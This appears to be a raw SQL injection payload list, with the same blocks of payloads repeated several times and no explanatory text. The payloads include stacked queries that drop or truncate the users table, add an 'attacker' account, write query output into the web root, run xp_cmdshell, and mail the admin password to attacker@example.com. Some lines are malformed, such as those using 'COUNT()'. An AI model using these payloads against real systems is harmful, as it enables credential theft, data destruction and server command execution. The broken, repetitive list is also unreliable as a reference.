1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR XML RAW;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON AUTO;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON AUTO, INCLUDE_NULL_VALUES;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) INTO DUMPFILE '/var/www/html/output.txt';--
1'; UPDATE users SET password='new_password' WHERE username='admin';--
1'; DELETE FROM users WHERE username='admin';--
1'; INSERT INTO users (username, password) VALUES ('attacker', 'hacked');--
1'; CREATE TABLE malicious_table (data VARCHAR(255));--
1'; DROP TABLE users;--
1'; ALTER TABLE users ADD COLUMN email VARCHAR(255);--
1'; TRUNCATE TABLE users;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%') OR 1=1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND '1'='1';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND '1'='2';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a'='a';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a'='b';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a' LIKE 'a%';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a' LIKE 'b%';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND LENGTH('abc')=3;--
1'; DECLARE @var INT; SET @var = (SELECT COUNT(*) FROM users); IF @var > 1 RAISERROR('Too many rows', 16, 1); --
1'; EXEC sp_executesql N'SELECT * FROM users WHERE username = @username AND password = @password', N'@username NVARCHAR(50), @password NVARCHAR(50)', @username = 'admin', @password = 'password'; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC sp_send_dbmail @recipients='attacker@example.com', @subject='SQLi attack', @body=@var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC xp_cmdshell @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC xp_cmdshell 'echo ' + @var + ' > C:\output.txt'; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC master.dbo.xp_cmdshell @var; --
1'; CREATE VIEW malicious_view AS SELECT * FROM users; --
1'; CREATE TRIGGER malicious_trigger ON users FOR INSERT AS INSERT INTO logs (log_data) VALUES ('User inserted'); --
1'; CREATE FUNCTION malicious_function() RETURNS TABLE AS RETURN (SELECT * FROM users); SELECT * FROM malicious_function(); --
1'; EXEC('SELECT * FROM users WHERE username = ''' + 'admin' + ''' AND password = ''' + 'password' + ''''); --
1'; MERGE INTO users USING (SELECT 'admin' AS username, 'password' AS password) AS attacker ON users.username = attacker.username WHEN MATCHED THEN UPDATE SET users.password = attacker.password; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + ':' + password FROM users); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + ':' + password FROM users FOR XML PATH('')); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + CHAR(58) + password FROM users); PRINT @var; --
 OR 1=(SELECT 1/0); --
' OR 1=(SELECT COUNT(*) FROM non_existent_table); --
' OR 1=(SELECT CAST('test' AS INT)); --
' OR 1=(SELECT COALESCE(username, 'admin')) FROM users WHERE username='admin'; --
' OR 1=(SELECT CASE WHEN (1=1) THEN 'a' ELSE (SELECT username FROM users WHERE username='admin') END); --
' OR 1=(SELECT 1 FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM users)>0); --
' OR 1=(SELECT username FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM users)>1); --
' OR 1=(SELECT IFNULL(username, 'admin') FROM users WHERE username='admin'); --
' OR 1=(SELECT CONCAT(username, password) FROM users WHERE username='admin'); --
' OR 1=(SELECT NULLIF(username, '') FROM users WHERE username='admin'); --
' OR 1=(SELECT 1/0); --
' OR 1=(SELECT CAST('test' AS INT)); --
' OR 1=(SELECT COALESCE(username, 'admin')) FROM users WHERE username='admin'; --
' OR 1=(SELECT CASE WHEN (1=1) THEN 'a' ELSE (SELECT username FROM users WHERE username='admin') END); --
' OR 1=(SELECT IFNULL(username, 'admin') FROM users WHERE username='admin'); --
' OR 1=(SELECT CONCAT(username, password) FROM users WHERE username='admin'); --
' OR 1=(SELECT NULLIF(username, '') FROM users WHERE username='admin'); --
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT TOP 1 password FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT MIN(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT MAX(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT AVG(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT SUM(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CONCAT(username, '-', password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COALESCE(password, 'No password') FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT NULLIF(password, '') FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CAST(password AS INT) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CHAR(65) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT ASCII(SUBSTRING(password,1,1)) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM non_existent_table);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%');
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION ALL SELECT NULL,NULL,NULL;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) ORDER BY 1;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) GROUP BY username;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT() FROM users) HAVING COUNT() > 1;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) LIMIT 1,1;
' OR 'a'='a
' OR 'a'='b
' OR '1'='1
' OR '1'='2
' OR 1=1--
' OR 1=2--
' OR 'a'='a'--
' OR 'a'='b'--
1 OR 'a'='a'
1 OR 'a'='b'
1 OR '1'='1'
1 OR '1'='2'
' OR 1/0 --
UNION ALL VALUES (1,2,3)--
UNION ALL VALUES (1,2,3)--
1 OR 'a'='a'
1 OR 'a'='b'
1 OR '1'='1'
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM non_existent_table);--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%');--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION ALL SELECT NULL,NULL,NULL;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) ORDER BY 1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) GROUP BY username;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) HAVING COUNT(*) > 1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) LIMIT 1,1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION SELECT * FROM sensitive_data;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) INTO OUTFILE '/var/www/html/output.txt';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR XML PATH;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON PATH;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR XML RAW;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON AUTO;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON AUTO, INCLUDE_NULL_VALUES;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) INTO DUMPFILE '/var/www/html/output.txt';--
1'; UPDATE users SET password='new_password' WHERE username='admin';--
1'; DELETE FROM users WHERE username='admin';--
1'; INSERT INTO users (username, password) VALUES ('attacker', 'hacked');--
1'; CREATE TABLE malicious_table (data VARCHAR(255));--
1'; DROP TABLE users;--
1'; ALTER TABLE users ADD COLUMN email VARCHAR(255);--
1'; TRUNCATE TABLE users;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%') OR 1=1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND '1'='1';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND '1'='2';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a'='a';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a'='b';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a' LIKE 'a%';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a' LIKE 'b%';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND LENGTH('abc')=3;--
1'; DECLARE @var INT; SET @var = (SELECT COUNT(*) FROM users); IF @var > 1 RAISERROR('Too many rows', 16, 1); --
1'; EXEC sp_executesql N'SELECT * FROM users WHERE username = @username AND password = @password', N'@username NVARCHAR(50), @password NVARCHAR(50)', @username = 'admin', @password = 'password'; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC sp_send_dbmail @recipients='attacker@example.com', @subject='SQLi attack', @body=@var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC xp_cmdshell @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC xp_cmdshell 'echo ' + @var + ' > C:\output.txt'; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC master.dbo.xp_cmdshell @var; --
1'; CREATE VIEW malicious_view AS SELECT * FROM users; --
1'; CREATE TRIGGER malicious_trigger ON users FOR INSERT AS INSERT INTO logs (log_data) VALUES ('User inserted'); --
1'; CREATE FUNCTION malicious_function() RETURNS TABLE AS RETURN (SELECT * FROM users); SELECT * FROM malicious_function(); --
1'; EXEC('SELECT * FROM users WHERE username = ''' + 'admin' + ''' AND password = ''' + 'password' + ''''); --
1'; MERGE INTO users USING (SELECT 'admin' AS username, 'password' AS password) AS attacker ON users.username = attacker.username WHEN MATCHED THEN UPDATE SET users.password = attacker.password; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + ':' + password FROM users); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + ':' + password FROM users FOR XML PATH('')); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + CHAR(58) + password FROM users); PRINT @var; --
 OR 1=(SELECT 1/0); --
' OR 1=(SELECT COUNT(*) FROM non_existent_table); --
' OR 1=(SELECT CAST('test' AS INT)); --
' OR 1=(SELECT COALESCE(username, 'admin')) FROM users WHERE username='admin'; --
' OR 1=(SELECT CASE WHEN (1=1) THEN 'a' ELSE (SELECT username FROM users WHERE username='admin') END); --
' OR 1=(SELECT 1 FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM users)>0); --
' OR 1=(SELECT username FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM users)>1); --
' OR 1=(SELECT IFNULL(username, 'admin') FROM users WHERE username='admin'); --
' OR 1=(SELECT CONCAT(username, password) FROM users WHERE username='admin'); --
' OR 1=(SELECT NULLIF(username, '') FROM users WHERE username='admin'); --
' OR 1=(SELECT 1/0); --
' OR 1=(SELECT CAST('test' AS INT)); --
' OR 1=(SELECT COALESCE(username, 'admin')) FROM users WHERE username='admin'; --
' OR 1=(SELECT CASE WHEN (1=1) THEN 'a' ELSE (SELECT username FROM users WHERE username='admin') END); --
' OR 1=(SELECT IFNULL(username, 'admin') FROM users WHERE username='admin'); --
' OR 1=(SELECT CONCAT(username, password) FROM users WHERE username='admin'); --
' OR 1=(SELECT NULLIF(username, '') FROM users WHERE username='admin'); --
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT TOP 1 password FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT MIN(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT MAX(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT AVG(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT SUM(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CONCAT(username, '-', password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COALESCE(password, 'No password') FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT NULLIF(password, '') FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CAST(password AS INT) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CHAR(65) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT ASCII(SUBSTRING(password,1,1)) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM non_existent_table);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%');
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION ALL SELECT NULL,NULL,NULL;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) ORDER BY 1;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) GROUP BY username;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT() FROM users) HAVING COUNT() > 1;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) LIMIT 1,1;
' OR 'a'='a
' OR 'a'='b
' OR '1'='1
' OR '1'='2
' OR 1=1--
' OR 1=2--
' OR 'a'='a'--
' OR 'a'='b'--
1 OR 'a'='a'
1 OR 'a'='b'
1 OR '1'='1'
1 OR '1'='2'
' OR 1/0 --
' OR 1/1 --
' OR 1/2 --
' OR 'a'='a'--
' OR 'a'='b'--
' OR '1'='1'--
' OR '1'='2'--
UNION ALL VALUES (1,2,3)--
UNION ALL VALUES (1,2,3)--
UNION ALL VALUES (1,2,3)--
1 OR 'a'='a'
1 OR 'a'='b'
1 OR '1'='1'
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM non_existent_table);--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%');--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION ALL SELECT NULL,NULL,NULL;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) ORDER BY 1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) GROUP BY username;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) HAVING COUNT(*) > 1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) LIMIT 1,1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION SELECT * FROM sensitive_data;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) INTO OUTFILE '/var/www/html/output.txt';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR XML PATH;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON PATH;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR XML RAW;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON AUTO;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON AUTO, INCLUDE_NULL_VALUES;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) INTO DUMPFILE '/var/www/html/output.txt';--
1'; UPDATE users SET password='new_password' WHERE username='admin';--
1'; DELETE FROM users WHERE username='admin';--
1'; INSERT INTO users (username, password) VALUES ('attacker', 'hacked');--
1'; CREATE TABLE malicious_table (data VARCHAR(255));--
1'; DROP TABLE users;--
1'; ALTER TABLE users ADD COLUMN email VARCHAR(255);--
1'; TRUNCATE TABLE users;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%') OR 1=1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND '1'='1';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND '1'='2';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a'='a';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a'='b';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a' LIKE 'a%';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a' LIKE 'b%';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND LENGTH('abc')=3;--
1'; DECLARE @var INT; SET @var = (SELECT COUNT(*) FROM users); IF @var > 1 RAISERROR('Too many rows', 16, 1); --
1'; EXEC sp_executesql N'SELECT * FROM users WHERE username = @username AND password = @password', N'@username NVARCHAR(50), @password NVARCHAR(50)', @username = 'admin', @password = 'password'; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC sp_send_dbmail @recipients='attacker@example.com', @subject='SQLi attack', @body=@var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC xp_cmdshell @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC xp_cmdshell 'echo ' + @var + ' > C:\output.txt'; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC master.dbo.xp_cmdshell @var; --
1'; CREATE VIEW malicious_view AS SELECT * FROM users; --
1'; CREATE TRIGGER malicious_trigger ON users FOR INSERT AS INSERT INTO logs (log_data) VALUES ('User inserted'); --
1'; CREATE FUNCTION malicious_function() RETURNS TABLE AS RETURN (SELECT * FROM users); SELECT * FROM malicious_function(); --
1'; EXEC('SELECT * FROM users WHERE username = ''' + 'admin' + ''' AND password = ''' + 'password' + ''''); --
1'; MERGE INTO users USING (SELECT 'admin' AS username, 'password' AS password) AS attacker ON users.username = attacker.username WHEN MATCHED THEN UPDATE SET users.password = attacker.password; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + ':' + password FROM users); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + ':' + password FROM users FOR XML PATH('')); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + CHAR(58) + password FROM users); PRINT @var; --
 OR 1=(SELECT 1/0); --
' OR 1=(SELECT COUNT(*) FROM non_existent_table); --
' OR 1=(SELECT CAST('test' AS INT)); --
' OR 1=(SELECT COALESCE(username, 'admin')) FROM users WHERE username='admin'; --
' OR 1=(SELECT CASE WHEN (1=1) THEN 'a' ELSE (SELECT username FROM users WHERE username='admin') END); --
' OR 1=(SELECT 1 FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM users)>0); --
' OR 1=(SELECT username FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM users)>1); --
' OR 1=(SELECT IFNULL(username, 'admin') FROM users WHERE username='admin'); --
' OR 1=(SELECT CONCAT(username, password) FROM users WHERE username='admin'); --
' OR 1=(SELECT NULLIF(username, '') FROM users WHERE username='admin'); --
' OR 1=(SELECT 1/0); --
' OR 1=(SELECT CAST('test' AS INT)); --
' OR 1=(SELECT COALESCE(username, 'admin')) FROM users WHERE username='admin'; --
' OR 1=(SELECT CASE WHEN (1=1) THEN 'a' ELSE (SELECT username FROM users WHERE username='admin') END); --
' OR 1=(SELECT IFNULL(username, 'admin') FROM users WHERE username='admin'); --
' OR 1=(SELECT CONCAT(username, password) FROM users WHERE username='admin'); --
' OR 1=(SELECT NULLIF(username, '') FROM users WHERE username='admin'); --
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT TOP 1 password FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT MIN(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT MAX(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT AVG(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT SUM(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CONCAT(username, '-', password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COALESCE(password, 'No password') FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT NULLIF(password, '') FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CAST(password AS INT) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CHAR(65) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT ASCII(SUBSTRING(password,1,1)) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM non_existent_table);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%');
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION ALL SELECT NULL,NULL,NULL;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) ORDER BY 1;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) GROUP BY username;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT() FROM users) HAVING COUNT() > 1;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) LIMIT 1,1;
' OR 'a'='a
' OR 'a'='b
' OR '1'='1
' OR '1'='2
' OR 1=1--
' OR 1=2--
' OR 'a'='a'--
' OR 'a'='b'--
1 OR 'a'='a'
1 OR 'a'='b'
1 OR '1'='1'
1 OR '1'='2'
' OR 1/0 --
' OR 1/1 --
' OR 1/2 --
' OR 'a'='a'--
' OR 'a'='b'--
' OR '1'='1'--
' OR '1'='2'--
UNION ALL VALUES (1,2,3)--
UNION ALL VALUES (1,2,3)--
1 OR 'a'='a'
1 OR 'a'='b'
1 OR '1'='1'
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM non_existent_table);--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%');--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION ALL SELECT NULL,NULL,NULL;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) ORDER BY 1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) GROUP BY username;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) HAVING COUNT(*) > 1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) LIMIT 1,1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION SELECT * FROM sensitive_data;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) INTO OUTFILE '/var/www/html/output.txt';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR XML PATH;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON PATH;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR XML RAW;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON AUTO;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON AUTO, INCLUDE_NULL_VALUES;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) INTO DUMPFILE '/var/www/html/output.txt';--
1'; UPDATE users SET password='new_password' WHERE username='admin';--
1'; DELETE FROM users WHERE username='admin';--
1'; INSERT INTO users (username, password) VALUES ('attacker', 'hacked');--
1'; CREATE TABLE malicious_table (data VARCHAR(255));--
1'; DROP TABLE users;--
1'; ALTER TABLE users ADD COLUMN email VARCHAR(255);--
1'; TRUNCATE TABLE users;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%') OR 1=1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND '1'='1';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND '1'='2';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a'='a';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a'='b';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a' LIKE 'a%';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a' LIKE 'b%';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND LENGTH('abc')=3;--
1'; DECLARE @var INT; SET @var = (SELECT COUNT(*) FROM users); IF @var > 1 RAISERROR('Too many rows', 16, 1); --
1'; EXEC sp_executesql N'SELECT * FROM users WHERE username = @username AND password = @password', N'@username NVARCHAR(50), @password NVARCHAR(50)', @username = 'admin', @password = 'password'; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC sp_send_dbmail @recipients='attacker@example.com', @subject='SQLi attack', @body=@var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC xp_cmdshell @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC xp_cmdshell 'echo ' + @var + ' > C:\output.txt'; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC master.dbo.xp_cmdshell @var; --
1'; CREATE VIEW malicious_view AS SELECT * FROM users; --
1'; CREATE TRIGGER malicious_trigger ON users FOR INSERT AS INSERT INTO logs (log_data) VALUES ('User inserted'); --
1'; CREATE FUNCTION malicious_function() RETURNS TABLE AS RETURN (SELECT * FROM users); SELECT * FROM malicious_function(); --
1'; EXEC('SELECT * FROM users WHERE username = ''' + 'admin' + ''' AND password = ''' + 'password' + ''''); --
1'; MERGE INTO users USING (SELECT 'admin' AS username, 'password' AS password) AS attacker ON users.username = attacker.username WHEN MATCHED THEN UPDATE SET users.password = attacker.password; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + ':' + password FROM users); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + ':' + password FROM users FOR XML PATH('')); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + CHAR(58) + password FROM users); PRINT @var; --
 OR 1=(SELECT 1/0); --
' OR 1=(SELECT COUNT(*) FROM non_existent_table); --
' OR 1=(SELECT CAST('test' AS INT)); --
' OR 1=(SELECT COALESCE(username, 'admin')) FROM users WHERE username='admin'; --
' OR 1=(SELECT CASE WHEN (1=1) THEN 'a' ELSE (SELECT username FROM users WHERE username='admin') END); --
' OR 1=(SELECT 1 FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM users)>0); --
' OR 1=(SELECT username FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM users)>1); --
' OR 1=(SELECT IFNULL(username, 'admin') FROM users WHERE username='admin'); --
' OR 1=(SELECT CONCAT(username, password) FROM users WHERE username='admin'); --
' OR 1=(SELECT NULLIF(username, '') FROM users WHERE username='admin'); --
